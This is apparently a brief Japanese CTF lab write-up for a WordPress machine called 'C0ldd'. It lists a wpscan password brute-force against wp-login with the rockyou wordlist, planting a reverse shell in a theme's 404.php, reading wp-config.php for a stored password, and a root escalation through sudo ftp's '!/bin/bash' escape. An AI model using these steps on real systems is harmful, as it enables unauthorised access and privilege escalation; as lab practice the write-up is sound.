---
title: "C0ldd"
date: 2024-03-16T14:04:24+09:00
draft: false
---

### user

- wordpress が動いている
- /hidden
  - C0lld, philip, hugo
- ```wpscan --url http://10.10.233.13 -U C0ldd -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 64```
- ログインすると apperrance が触れるので，404.php にリバースシェルを貼る
- ```cat /var/www/html/wp-config.php```
  - Coldd のパスワードが見える
  - su C0ldd

### root

- ```sudo -l``` で ftp が使える
- ftp -> !/bin/bash
